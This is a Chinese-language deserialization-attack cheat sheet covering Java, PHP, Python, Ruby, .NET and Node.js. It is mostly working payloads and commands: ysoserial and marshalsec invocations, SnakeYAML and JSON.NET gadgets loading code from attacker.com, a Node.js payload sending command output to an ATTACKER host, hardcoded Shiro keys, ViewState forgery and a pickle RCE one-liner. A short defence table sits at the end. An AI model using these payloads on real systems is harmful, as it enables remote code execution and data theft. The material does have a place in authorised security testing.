# 反序列化测试（deserialization）

> 本文为 `deserialization-test.md` 的中文版（就地翻译整理，重复段落已合并去重，技术内容与英文原版一致）。
> 定位：Java / PHP / Python / Ruby / .NET / Node.js 各语言反序列化的指纹、gadget、payload、工具与检测方法速查。

## 1. 流量指纹识别 — 是不是反序列化

### Java 序列化对象

| 特征 | 到哪里找 |
|---|---|
| Hex `ac ed 00 05` | 请求/响应体、cookie、POST 参数里的原始二进制 |
| Base64 `rO0AB` | Cookie（如 `rememberMe`）、隐藏表单字段、JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP 请求头 |
| T3 / IIOP 协议流量 | WebLogic 端口（7001、7002） |

### PHP 序列化对象

| 特征 | 到哪里找 |
|---|---|
| `O:NUMBER:"ClassName"` 模式 | POST body、cookie、session 文件 |
| `a:NUMBER:{`（数组） | 同上 |
| `phar://` URI 使用 | 接受用户可控路径的文件操作 |

### Python Pickle

| 特征 | 到哪里找 |
|---|---|
| Hex `80 03` 或 `80 04`（协议 3/4） | 请求、消息队列中的二进制数据 |
| Base64 编码的二进制 blob | API 参数、cookie、Redis 值 |
| 源码里的 `pickle.loads` / `pickle.load` | 代码审计 / 白盒 |

---

## 2. JAVA — GADGET 链与工具

### ysoserial — 主工具

```bash
# 生成 payload（示例：CommonsCollections1 链执行命令）
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64 编码便于 HTTP 传输
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# 常用链（按易命中程度排序）：
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1                — Groovy
# Hibernate1             — Hibernate
# JBossInterceptors1     — JBoss
# Jdk7u21                — JDK 7u21（无额外依赖）
# URLDNS                 — 仅 DNS 确认（不 RCE、处处可用）
```

### URLDNS — 安全确认探针

URLDNS 触发一次 DNS 查询但不执行命令——适合在无破坏的情况下确认「确实发生反序列化」：

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

collaborator 收到 DNS = 确认存在反序列化。之后可升级为 RCE 链。

### Commons Collections — 经典链

当 `org.apache.commons.collections`（3.x）在 classpath 上且应用对不可信数据调用 `readObject()` 时存在漏洞。

链关键类：`InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → 反序列化期间触发 `Runtime.exec()`。

### Apache Shiro — rememberMe 反序列化

Shiro 用 AES-CBC 把序列化后的 Java 对象加密后放进 `rememberMe` cookie。

```text
已知硬编码密钥（SHIRO-550 / CVE-2016-4437）：
kPH+bIxk5D2deZiIxcaaaA==          # 最常见默认
wGJlpLanyXlVB1LUUWolBg==          # 旧版另一常见默认
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**攻击流程**：
1. 探测：非法会话收到 `rememberMe=deleteMe` 响应 cookie
2. 生成 ysoserial payload（推荐 CommonsCollections6，兼容广）
3. 用已知密钥 + 随机 IV 做 AES-CBC 加密
4. Base64 编码 → 作为 `rememberMe` cookie 值
5. 发请求 → 服务端解密 → 反序列化 → RCE

**打 RCE 前的 DNSLog 确认**：用 URLDNS 链 → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → 加密 → 写 cookie → 查 DNSLog 有无命中。

**修复后（随机密钥）**：密钥仍可能经 padding oracle 泄露，或走其它 CVE（SHIRO-721）。

### Shiro rememberMe 默认钥实测（验证/防假阴性手法 · 2026-09 实战沉淀）

> 定位：方法论/避坑，不是某次高危命中，不写短表/假点。换任何 Shiro/RuoYi 系登录站都能直接用。

**1) 先判 RememberMeManager 是否启用 + cookie 名对不对**
任意请求带垃圾 `rememberMe=<base64>`，响应 Set-Cookie 出现 `rememberMe=deleteMe` → 管理器启用且 cookie 名就是 `rememberMe`（名字错不会触发处理）。没 deleteMe → 别在这条链上耗。

**2) 两种互补的默认钥判定，别只依赖一种**
- **零外带 deleteMe 神谕（静默快）**：本机词表 `C:\Users\Nan\nuclei-templates\helpers\wordlists\shiro_encrypted_keys.txt`（51 组，`key:预计算payload`，payload = 用该 key 加密的合法 PrincipalCollection）。把每行 payload 原样塞 `rememberMe` → **密钥对 → 响应不带 deleteMe**（Shiro 反序列化出 PrincipalCollection 不抛错）；密钥错 → deleteMe。前提：payload 得是目标 Shiro 版本能反序列化的对象，形态不匹配会对也 deleteMe → **假阴 → 用下一种补**。
- **URLDNS → OAST 外带（兜底，不依赖 PrincipalCollection 兼容）**：自己用候选 key 生成 cookie 塞 URLDNS 对象，目标密钥若对上会在反序列化时解析载荷 URL → OAST 记录即命中。判定与载荷形态无关。

**3) CBC / GCM 双测（RuoYi fork 有 GCM）**
- CBC：`base64(iv(16) || AES/CBC/PKCS5Padding(plain))`
- GCM：`base64(iv(16) || AES/GCM/NoPadding(plain)，128bit tag 附密文尾)`
- 密钥 = base64 解码 16 字节；cookie 名 `rememberMe`。只测 CBC 会假阴。

**4) OAST 通道必须先自检（dnslog.cn 教训，防静默假阴性）**
实测 dnslog.cn 从某网络返回 127.0.0.1 通配解析、**完全不记录**——不先自检会把「外带工具坏」误判成「目标无洞」。对策：① 优先自包含 **interactsh-client**（`-auth=false -n 1 -ps`，注册即得 `*.oast.pro/oast.online`，本地轮询输出）；② 打目标前，先在**本机**把同一载荷反序列化一遍确认真触发 DNS（OAST 有记录 = 载荷有效、通道可用），再解读目标负结果为「密钥不对」而非「载荷/通道坏」。

**5) URLDNS 生成防本机污染**
构造时用 SilentURLStreamHandler（`hashCode()` 返回 -1）建 URL，避免**攻击机自身** DNS 先打到外带域造成误判；HashMap 反序列化会重算 key.hashCode → 目标侧才解析。

**6) 判完形态**
51 CBC + 若干 GCM 常用默认钥全负、载荷自检又通过 → 大概率**自定义密钥**，默认钥链关闭转其它面。禁止把「这站没打穿」写成假点（那是单站现场，不是形态不是洞）。

### WebLogic 反序列化

多个入口：
- **T3 协议**（端口 7001）：直接注入序列化对象
- **XMLDecoder**（CVE-2017-10271）：经 `/wls-wsat/CoordinatorPortType` 做基于 XML 的反序列化
- **IIOP 协议**：T3 之外的选择

```bash
# T3 探测 — 检查 T3 是否暴露：
nmap -sV -p 7001 TARGET
# 找：服务 banner 里的 "T3" 或 "WebLogic"
```

### Java RMI Registry

RMI Registry（端口 1099）按设计接受序列化对象：

```bash
# ysoserial 的 RMI 利用模块：
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# 前提：目标 classpath 上有可利用库
# 适用：未启用 JEP 290 反序列化过滤的 JDK <= 8u111
```

### JDK 版本限制

| JDK 版本 | 影响 |
|---|---|
| < 8u121 | RMI/LDAP 远程类加载可用 |
| 8u121-8u190 | RMI 的 `trustURLCodebase=false`；LDAP 仍可用 |
| >= 8u191 | RMI 与 LDAP 远程类加载都被拦 |
| >= 8u191 绕过 | 用 LDAP 返回序列化 gadget 对象（而非远程类） |

---

## 3. JAVA GADGET 链版本兼容矩阵

### 3.1 CommonsCollections 链

| 链 | 依赖库 | 版本范围 | JDK 限制 | 执行方式 |
|---|---|---|---|---|
| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72（InvokerTransformer 被过滤） | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | 无（用 `TemplatesImpl`） | 字节码执行 |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl`（字节码） |
| **CC4** | Commons Collections 4.x | 4.0 | 无 | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 也可（不再查 InvokerTransformer） | 经 `TiedMapEntry` 走 `Runtime.exec()` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | 全部 JDK | 经 `HashSet` 触发 `Runtime.exec()` |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | 全部 JDK | 经 `Hashtable` |

**推荐顺序**：CC6 → CC7 → CC5（兼容最广、无 JDK 版本限制）。

### 3.2 CommonsBeanutils 链

| 链 | 依赖 | 版本 | 说明 |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4，CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1（无 CC）** | 仅 Commons BeanUtils 1.x | BU 1.8.3–1.9.4 | 依赖 `commons-logging`；无需 CC |

### 3.3 Spring Framework 链

| 链 | 依赖 | 版本 | 说明 |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4（已知） | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 3.4 仅 JDK 链（无外部依赖）

| 链 | JDK 版本 | 说明 |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`；7u25 已修复 |
| **JRMPClient** | 全部 | 向攻击者 RMI server 发起 JRMP 调用（非直接 RCE，可成链） |
| **JRMPListener** | 全部 | 在受害机开 RMI listener（作用有限） |
| **URLDNS** | 全部 | 仅 DNS；确认探针，无 RCE |

### 3.5 其它值得注意的链

| 链 | 依赖 | 说明 |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x（含 javassist 或 cglib） | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | 经 `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | 现代应用少见 |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` 反序列化 |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` 反序列化 |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin 框架 | `PropertysetItem` 链 |
| **Wicket1** | Apache Wicket | 特定 classpath |
| **C3P0** | C3P0 连接池 | `PoolBackedDataSource` → JNDI 或 URL classloading |
| **Clojure** | Clojure 运行时 | `core$fn` → 任意函数执行 |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → JVM 内任意 Python 执行 |
| **MozillaRhino1/2** | Mozilla Rhino JS 引擎 | `NativeJavaObject` 链 |

### 3.6 链选择决策树

```
识别目标库（错误信息、pom.xml、/META-INF/MANIFEST.MF）：
├── classpath 上有 Commons Collections 3.x？
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x？
│   └── CC2, CC4
├── Commons BeanUtils？
│   └── CB1（带或不带 CC）
├── Spring Framework？
│   └── Spring1, Spring2
├── Groovy？
│   └── Groovy1
├── Hibernate + javassist/cglib？
│   └── Hibernate1, Hibernate2
├── 没识别到外部库？
│   ├── 先 URLDNS（确认）
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → 连到带完整 gadget 的攻击者 RMI server
└── 都不确定？试 CC6 → 再 CB1 → 再 URLDNS
```

---

## 4. SNAKEYAML GADGET

### 4.1 原理

SnakeYAML（Java YAML 解析器）支持用 `!!` 标签构造任意 Java 对象。当对不可信输入调用 `Yaml.load()`（未用 `SafeConstructor`）时，可实例化任意类。

### 4.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**利用流程**：
1. SnakeYAML 构造指向攻击者 JAR 的 `URLClassLoader`
2. 用该 classloader 构造 `ScriptEngineManager`
3. `ScriptEngineManager` 用 `ServiceLoader` → 加载 `META-INF/services/javax.script.ScriptEngineFactory`
4. 攻击者 JAR 内含恶意 `ScriptEngineFactory` 实现 → RCE

**攻击者 JAR 结构**：
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  （实现 ScriptEngineFactory，静态块里执行命令）
```

### 4.3 SPI 变体

```yaml
# ProcessBuilder（直接命令执行，Java 9+）：
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# URLClassLoader 的另一种形式：
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 4.4 检测

```
# HTTP 流量里的特征：
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- POST body / 文件上传 / 配置端点里的含 !! 标签的 YAML
- 接收 YAML 的 Spring Cloud Config Server 端点

# 测试探针（基于 DNS 的安全检测）：
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 5. HESSIAN / KRYO / AVRO / XSTREAM 反序列化

### 5.1 Hessian

Caucho Hessian 是二进制 web-service 协议。`HessianInput.readObject()` 可反序列化任意 Java 对象。

```
# 流量指纹：
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- 二进制开头：'c'（call）、'H'（Hessian 2.0）、'r'（reply）
- URL 模式：/hessian、/remoting/*、/service/*

# 已知危险配置：
- Spring Remoting + HessianServiceExporter
- Resin 应用服务器（Caucho）
- Dubbo RPC 框架（Apache）
```

**Hessian gadget 链**（用 `marshalsec` 工具）：

```bash
# 生成 Hessian payload：
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 变体：
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**常用 Hessian gadget**：
- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI 或 `TemplatesImpl`
- `Resin` → `QName` → classloading

### 5.2 Kryo

Kryo 是快速 Java 序列化框架（常用于 Spark、Storm、Akka）。

```
# 流量指纹：
- 二进制格式，无标准魔数
- 常在消息队列（Kafka、RabbitMQ），少见走 HTTP
- 配置键：kryo.setRegistrationRequired(false) → 有漏洞

# 利用方式：
# 若不要求注册，任何类都可被反序列化
# 用标准 Java gadget（classpath 上有 CC 链即可用）

# 若要求注册但含危险类：
# 找：java.net.URL、javax.management.*、java.lang.ProcessBuilder
```

### 5.3 Apache Avro

```
# 流量指纹：
- Content-Type: avro/binary、application/avro
- 多部署用 schema registry
- 带 schema 定义的二进制结构

# Avro 反序列化受 schema 约束（相对安全）
# 但以下配置可能被滥用：
# - Schema 指定 "java-class" 属性
# - 注册自定义反序列化器
# - GenericDatumReader 配 ReflectDatumReader
```

### 5.4 XStream

```
# 流量指纹：
- 含 <sorted-set>、<dynamic-proxy>、<tree-map> 的 XML
- 常用于 Jenkins、Bamboo、TeamCity

# Payload（1.4.7 之前）：
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# 工具：marshalsec 支持 XStream payload
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 6. PHP — unserialize 与 PHAR

### 6.1 魔术方法链

PHP 反序列化会按顺序触发魔术方法：

```
__wakeup()  → unserialize() 时立刻调用
__destruct() → 对象被 GC 时调用
__toString() → 对象被当字符串用时调用
__call()     → 调用不存在的方法时调用
```

**攻击**：构造一个序列化对象，其 `__destruct()` 或 `__wakeup()` 触发危险操作（文件写、SQL 查询、命令执行、SSRF）。

### 6.2 序列化对象格式

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:长度:"类名":属性数:{属性}
```

### 6.3 phpMyAdmin 配置注入（真实案例）

phpMyAdmin `PMA_Config` 类通过 `source` 属性读取任意文件：

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### 6.4 PHPGGC — PHP Gadget 链生成器

```bash
# 列出可用链：
phpggc -l

# 生成 payload（示例：Laravel RCE）：
phpggc Laravel/RCE1 system id

# 常用链：
# Laravel/RCE1-4
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### 6.5 Phar 反序列化

Phar 归档包含序列化的元数据。任何对 `phar://` URI 的文件操作都会触发反序列化——即使从未直接调用 `unserialize()`。

**触发函数**（部分）：
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**攻击流程**：
1. 上传合法文件（如带 phar polyglot 的 JPEG）
2. 触发文件操作：`file_exists("phar://uploads/avatar.jpg")`
3. PHP 反序列化 phar 元数据 → gadget 链执行

```bash
# 用 PHPGGC 生成 phar：
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

### 6.6 PHP create_function + 反序列化组合

```php
// 当某 PHP 类在 __destruct / __wakeup 里用了 create_function：
// 序列化一个对象，使传入 lambda 的参数为：
$a = "create_function";
$b = ";}system('id');/*";
// lambda 变成：function(){ ;}system('id');/* }
// 关闭原函数体并注入命令

// 序列化形式中，私有属性需加 \0ClassName\0 前缀：
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 7. PYTHON — PICKLE

### 7.1 __reduce__ 方法

Python 的 `pickle.loads()` 在反序列化时会调用对象的 `__reduce__()`，后者可返回可调用对象 + 参数：

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# 把 payload 发给调用 pickle.loads() 的目标
```

### 7.2 分析 Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# 显示 opcodes：GLOBAL、REDUCE 等
# 找引用危险模块的 GLOBAL（os、subprocess、builtins）
```

### 7.3 常见 Python 反序列化 Sink

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML 未用 Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### 7.4 防御绕过：RestrictedUnpickler

即使用了 `RestrictedUnpickler.find_class` 白名单，仍要检查白名单是否过宽：

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

若 `safe_builtins` 含 `eval`、`exec` 或 `__import__` → 仍可利用。

---

## 8. RUBY — Marshal 与 YAML.load

### 8.1 Ruby Marshal

- 对不可信数据 `Marshal.load` → RCE
- 指纹：二进制数据，无常见文本头（Hex 开头 `04 08`）
- 各 Ruby 版本存在不同 gadget 链
- 可用十六进制载荷验证：`[hex_string].pack("H*")`

```ruby
# Ruby 的 Marshal.load 等价于 Java 的 ObjectInputStream
# 任何实现 marshal_dump/marshal_load 的类都可能成为 gadget

# 检测：二进制数据以 \x04\x08 开头
# PoC gadget（需要目标作用域内有可利用类）：
payload = "\x04\x08..." # hex 编码的 gadget 链
Marshal.load(payload)    # 触发任意代码执行
```

### 8.2 YAML.load（最危险的常见 Ruby 反序列化 Sink）

`YAML.load`（非 `YAML.safe_load`）能构造任意 Ruby 对象，等价于 Java 的 `ObjectInputStream.readObject()`。

**Ruby ≤ 2.7.2** — `Gem::Requirement` 链：

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "|id"
```

**Ruby 2.x–3.x** — `Gem::Installer` 链（更长、多步）：

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- 这里写命令
      method_id: :resolve
```

### 8.3 Psych YAML 解析器版本

| Ruby 版本 | Psych 版本 | YAML.load 行为 |
|---|---|---|
| ≤ 2.0 | Psych 2.x | 任意对象构造 |
| 2.1–2.7 | Psych 3.x | 任意（2.6+ 弃用告警） |
| 3.0 | Psych 3.3 | YAML.load 告警但仍可用 |
| 3.1+ | Psych 4.0 | YAML.load 默认走 safe_load；需 `unsafe_load` |

### 8.4 工具
- `elttam/ruby-deserialization` — Ruby gadget 链生成器
- `mbechler/ysoserial`（Ruby 变体）

---

## 9. .NET — 反序列化

### 9.1 流量指纹

| 特征 | 序列化器 |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| `__VIEWSTATE` 开头 | LosFormatter / ObjectStateFormatter |
| 含 `$type` 的 JSON | JSON.NET（Newtonsoft）TypeNameHandling |
| 含 `<ObjectDataProvider>` 的 XML | XmlSerializer / NetDataContractSerializer |

| 魔数（Hex） | Base64 前缀 | 格式 |
|---|---|---|
| `AAEAAD`（base64）/ `00 01 00 00 00`（hex） | `AAEAAAD/////` | BinaryFormatter |
| `FF 01` / `/w`（base64） | `FF0100...` | ViewState（ObjectStateFormatter） |
| `<`（XML 开头） | — | XmlSerializer / DataContractSerializer |
| JSON 的 `$type` 键 | — | JSON.NET（TypeNameHandling 开启） |

### 9.2 BinaryFormatter / LosFormatter（最危险）

```
# 任意类型实例化
# 工具：ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc" -o raw

# LosFormatter 内部包 BinaryFormatter — 同一批 gadget 可用
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### 9.3 ViewState

#### 9.3.1 结构

```
__VIEWSTATE 是 ASP.NET WebForms 的隐藏字段：
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

base64 解码后的结构：
- 序列化对象图（LosFormatter → ObjectStateFormatter → BinaryFormatter）
- 可选 MAC（消息认证码）— HMAC-SHA1/SHA256
- 可选加密 — AES
```

#### 9.3.2 machineKey 前提

ViewState 的 MAC/加密密钥来自 `web.config`：

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**如何拿 machineKey**：
1. LFI / 目录穿越 → 读 `web.config`
2. 信息泄露（错误页、调试端点）
3. 特定产品的已知默认密钥（SharePoint、DotNetNuke）
4. 服务器残留的 `.config` 备份文件
5. Azure App Service：有时在 `WEBSITE_AUTH_ENCRYPTION_KEY` 环境变量里

#### 9.3.3 ViewState 伪造

```bash
# 已知 machineKey — 生成恶意 ViewState：
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# 无加密（enableViewStateMac=false 或旧 .NET）：
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

#### 9.3.4 无 machineKey 的 ViewState 攻击

```
# .NET Framework < 4.5 且 web.config 里 enableViewStateMac="false"：
# 无 MAC → 直接构造恶意 ViewState

# Blacklist3r 工具：尝试已知/默认密钥：
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# 测试常见 validation/decryption key 对

# ASP.NET __VIEWSTATEGENERATOR 值：
# 有助于识别目标页面 ViewState 的密钥派生
# 格式：隐藏字段中的 8 个 hex 字符
```

### 9.4 XmlSerializer + ObjectDataProvider

```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### 9.5 JSON.NET（$type 滥用）

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

```json
// 替代：System.Configuration.Install.AssemblyInstaller
// 从攻击者控制的路径加载程序集
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

`TypeNameHandling` 设为 `Auto`、`Objects`、`Arrays`、`All` 之一时存在漏洞。

### 9.6 NetDataContractSerializer

与 BinaryFormatter 类似，XML 中含完整类型信息。

### 9.7 工具
- `pwntester/ysoserial.net` — 主 .NET gadget 链生成器
- `NotSoSecure/Blacklist3r` — 用已知 machineKey 解密/伪造 ViewState
- Gadget 链：TypeConfuseDelegate、TextFormattingRunProperties、PSObject、ActivitySurrogateSelectorFromFile

---

## 10. NODE.JS — 反序列化

### 10.1 node-serialize（IIFE 模式）

```javascript
// 内部用 eval() 实现
// payload 用 _$$ND_FUNC$$_ 标记 + IIFE：

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// 末尾的 () 使其成为立即调用函数表达式（IIFE）
// unserialize() 处理时执行该函数

// 完整 HTTP 利用（cookie 或 body 中）：
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### 10.2 funcster

```javascript
// funcster 通过 constructor.constructor 反序列化函数：
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
// 变体：
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### 10.3 cryo

与 funcster 类似，序列化带函数支持的 JS 对象。

---

## 11. 检测方法论

```
请求/cookie 里发现二进制 blob 或编码对象？
├── Java 特征（ac ed / r0OAB）？
│   ├── 用 URLDNS 探针做安全确认
│   ├── 识别依赖库（错误信息、已知产品）
│   └── 试匹配已识别库的 ysoserial 链
│
├── PHP 特征（O:N:"...")？
│   ├── 识别框架（Laravel、Symfony、WordPress）
│   ├── 为该框架试 PHPGGC 链
│   └── 检查文件操作里的 phar:// 包装器
│
├── Python（不透明二进制、base64 blob）？
│   ├── 试带 DNS 回调的 pickle payload
│   └── 检查是否用了不安全的 PyYAML load
│
└── 不确定？
    ├── 试 Java URLDNS payload — 查 DNS
    ├── 试 PHP 序列化测试串
    └── 盯类加载失败的错误信息
```

---

## 12. 防御

| 语言 | 缓解 |
|---|---|
| Java | JEP 290 反序列化过滤；白名单允许类；别对不可信数据用 `ObjectInputStream`；改用 JSON/Protobuf |
| PHP | 别对用户输入用 `unserialize()`；改用 `json_decode()`；文件操作里拦 `phar://` |
| Python | `pickle` 只用于可信数据；外部输入用 `json`；PyYAML 一律 `yaml.safe_load()` |

---

## 13. 快速参考 — 关键 Payload

```text
# Java — URLDNS 确认
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — CommonsCollections RCE
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro 默认密钥测试
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 14. 反序列化流量指纹速查表

### 14.1 按协议 / 格式

| 魔数（Hex） | Base64 前缀 | 格式 | 语言 |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java 序列化对象 | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter（ViewState） | .NET |
| `80 02`~`80 05` | 不一 | Python pickle（协议 2/3/4/5） | Python |
| `89 50 4E 47` | `iVBOR` | PNG（可能含 phar polyglot） | PHP |
| `4F 3A` | `Tz`（`O:` 的 base64） | PHP 序列化对象（`O:N:"Class"`） | PHP |
| `61 3A` | `YT`（`a:` 的 base64） | PHP 序列化数组（`a:N:{`） | PHP |
| `04 08` | 不一 | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip（可能包裹序列化数据） | 任意 |
